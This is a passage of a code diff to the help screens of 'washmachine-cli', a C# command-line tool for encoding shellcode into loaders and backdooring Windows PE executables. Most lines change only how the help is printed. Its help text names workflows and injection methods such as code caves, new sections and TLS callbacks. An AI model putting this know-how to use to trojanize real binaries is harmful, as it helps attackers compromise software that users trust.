-        commandTable.AddRow($"[{UiColors.Accent}]list[/]",      $"[{UiColors.Value}]List available templates, encoders, snippets, or compilers[/]");
-        commandTable.AddRow($"[{UiColors.Accent}]provision[/]", $"[{UiColors.Value}]Download and install required external tools (Bin2Shell)[/]");
-        commandTable.AddRow($"[{UiColors.Accent}]test[/]",      $"[{UiColors.Value}]Run the automated test harness[/]");
-
-        AnsiConsole.Write(UsageFormatter.MakePanel("Core Commands", commandTable));
-
-        var usageRows = new Rows(
-            new Markup($"[{UiColors.Muted}]washmachine-cli[/] [{UiColors.Accent}]<command>[/] [{UiColors.Muted}][[options]][/]"));
-        AnsiConsole.Write(UsageFormatter.MakePanel("Usage", usageRows));
-
-        var exampleRows = new Rows(
-            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli encode -s payload.bin -t shellcode-minimal[/]"),
-            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli backdoor --pe app.exe -s payload.bin -m new-section[/]"),
-            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli analyze target.exe[/]"),
-            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli strip loader.exe -o loader.bin[/]"),
-            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli list --templates[/]"),
-            new Text(""),
-            new Markup($"[{UiColors.Muted}]Run[/] [{UiColors.Accent}]help <command>[/] [{UiColors.Muted}]for detailed options, or[/] [{UiColors.Accent}]help --all[/] [{UiColors.Muted}]for extended reference.[/]"));
-        AnsiConsole.Write(UsageFormatter.MakePanel("Quick Examples", exampleRows));
-
-        return 0;
-    }
-
-    /// <summary>Extended scrollable help — prints every command's full usage in one view.</summary>
-    private static int PrintExtendedHelp()
-    {
-        AnsiConsole.WriteLine();
-        Banner.Render();
-
-        var headerRows = new Rows(
-            new Markup($"[{UiColors.Muted}]Scrollable reference for all commands and options.[/]"),
-            new Markup($"[{UiColors.Muted}]Tip: Pipe to[/] [{UiColors.Accent}]less[/] [{UiColors.Muted}]or scroll your terminal buffer.[/]"));
-        AnsiConsole.Write(UsageFormatter.MakePanel("Extended Command Reference", headerRows));
-
-        // 1. Table of Contents
-        var tocTable = new Table()
-            .Border(TableBorder.Simple)
-            .BorderColor(UiColors.BoxBorderColor)
-            .AddColumn(new TableColumn($"[{UiColors.Accent}]#[/]").Centered())
-            .AddColumn(new TableColumn($"[{UiColors.Accent}]Command[/]"))
-            .AddColumn(new TableColumn($"[{UiColors.Accent}]Purpose[/]"));
-
-        tocTable.AddRow($"[{UiColors.Muted}]1[/]", $"[{UiColors.Accent}]encode[/]",    $"[{UiColors.Value}]Encode shellcode via Bin2Shell and build a loader[/]");
-        tocTable.AddRow($"[{UiColors.Muted}]2[/]", $"[{UiColors.Accent}]analyze[/]",   $"[{UiColors.Value}]Inspect PE headers, sections, imports, code caves[/]");
-        tocTable.AddRow($"[{UiColors.Muted}]3[/]", $"[{UiColors.Accent}]backdoor[/]",  $"[{UiColors.Value}]Inject shellcode into an existing PE binary[/]");
-        tocTable.AddRow($"[{UiColors.Muted}]4[/]", $"[{UiColors.Accent}]strip[/]",     $"[{UiColors.Value}]Extract flat binary from PE sections[/]");
-        tocTable.AddRow($"[{UiColors.Muted}]5[/]", $"[{UiColors.Accent}]list[/]",      $"[{UiColors.Value}]List templates, encoders, snippets, compilers[/]");
-        tocTable.AddRow($"[{UiColors.Muted}]6[/]", $"[{UiColors.Accent}]provision[/]", $"[{UiColors.Value}]Download external tools (Bin2Shell)[/]");
-        tocTable.AddRow($"[{UiColors.Muted}]7[/]", $"[{UiColors.Accent}]test[/]",      $"[{UiColors.Value}]Run the automated test harness[/]");
-        AnsiConsole.Write(UsageFormatter.MakePanel("Table of Contents", tocTable));
-
-        // 2. Each command's full help
-        PrintEncodeUsage();    AnsiConsole.WriteLine();
-        PrintAnalyzeUsage();   AnsiConsole.WriteLine();
-        PrintBackdoorUsage();  AnsiConsole.WriteLine();
-        PrintStripUsage();     AnsiConsole.WriteLine();
-        PrintListUsage();      AnsiConsole.WriteLine();
-        PrintProvisionUsage(); AnsiConsole.WriteLine();
-        PrintTestUsage();      AnsiConsole.WriteLine();
-
-        // 3. Workflow examples
-        var workflowRows = new Rows(
-            new Markup($"[{UiColors.Accent}]Workflow 1:[/] [{UiColors.Value}]Encode shellcode into a standalone loader[/]"),
-            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli encode -s payload.bin -t shellcode-minimal -e 1[/]"),
-            new Text(""),
-            new Markup($"[{UiColors.Accent}]Workflow 2:[/] [{UiColors.Value}]Backdoor a legitimate PE with shellcode[/]"),
-            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli analyze target.exe[/]"),
-            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli backdoor --pe target.exe -s payload.bin -m new-section -o patched.exe[/]"),
-            new Text(""),
-            new Markup($"[{UiColors.Accent}]Workflow 3:[/] [{UiColors.Value}]Strip a loader to flat binary, then inject into PE[/]"),
-            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli encode -s payload.bin[/]"),
-            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli strip loader.exe -o loader.bin[/]"),
-            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli backdoor --pe target.exe -s loader.bin -m code-cave[/]"));
-        AnsiConsole.Write(UsageFormatter.MakePanel("Typical Workflows", workflowRows));
-
-        // 4. Injection Methods Quick Reference
-        var injTable = new Table()
-            .Border(TableBorder.Simple)
-            .BorderColor(UiColors.BoxBorderColor)
-            .AddColumn(new TableColumn($"[{UiColors.Accent}]Method[/]"))
-            .AddColumn(new TableColumn($"[{UiColors.Accent}]Flag[/]"))
-            .AddColumn(new TableColumn($"[{UiColors.Accent}]Arch[/]"))
-            .AddColumn(new TableColumn($"[{UiColors.Accent}]Description[/]"));
-
-        injTable.AddRow($"[{UiColors.Value}]Code Cave[/]",           $"[{UiColors.Accent}]-m code-cave[/]",    $"[{UiColors.Muted}]x86/x64[/]", $"[{UiColors.Muted}]Reuse slack space in existing sections[/]");
-        injTable.AddRow($"[{UiColors.Value}]New Section[/]",         $"[{UiColors.Accent}]-m new-section[/]",  $"[{UiColors.Muted}]x86/x64[/]", $"[{UiColors.Muted}]Append a new PE section with payload[/]");
-        injTable.AddRow($"[{UiColors.Value}]Section Extension[/]",   $"[{UiColors.Accent}]-m section-ext[/]",  $"[{UiColors.Muted}]x86/x64[/]", $"[{UiColors.Muted}]Extend last section to embed payload[/]");
-        injTable.AddRow($"[{UiColors.Value}]Text Padding[/]",        $"[{UiColors.Accent}]-m text-pad[/]",     $"[{UiColors.Muted}]x86/x64[/]", $"[{UiColors.Muted}]Write into .text VirtualSize↔RawSize gap[/]");
-        injTable.AddRow($"[{UiColors.Value}]TLS Callback[/]",        $"[{UiColors.Accent}]-m tls-callback[/]", $"[{UiColors.Muted}]x64[/]",     $"[{UiColors.Muted}]TLS callback runs payload before main[/]");
-        AnsiConsole.Write(UsageFormatter.MakePanel("Injection Methods Quick Reference", injTable));
-
-        // 5. Global notes
-        var noteRows = new Rows(
-            new Markup($"[{UiColors.Muted}]• All commands support[/] [{UiColors.Accent}]--help[/] [{UiColors.Muted}]or[/] [{UiColors.Accent}]-h[/] [{UiColors.Muted}]for individual help[/]"),
-            new Markup($"[{UiColors.Muted}]• Use[/] [{UiColors.Accent}]--json[/] [{UiColors.Muted}]where available for machine-readable output[/]"),
-            new Markup($"[{UiColors.Muted}]• Run[/] [{UiColors.Accent}]provision[/] [{UiColors.Muted}]once before using encoding features[/]"),
-            new Markup($"[{UiColors.Muted}]• Interactive REPL mode: launch without arguments for an interactive session[/]"));
-        AnsiConsole.Write(UsageFormatter.MakePanel("Global Notes", noteRows));
-
         return 0;
     }
 
     private static int PrintUnknownCommand(string command)
     {
-        var validCommands = new[] { "encode", "analyze", "backdoor", "strip", "list", "provision", "test", "help" };
+        var validCommands = new[] { "encode", "analyze", "backdoor", "strip", "show", "provision", "test", "help" };
 
         AnsiConsole.WriteLine();
         AnsiConsole.MarkupLine($"[{UiColors.Error}]Error:[/] [{UiColors.Value}]Unknown command '{Markup.Escape(command)}'[/]");
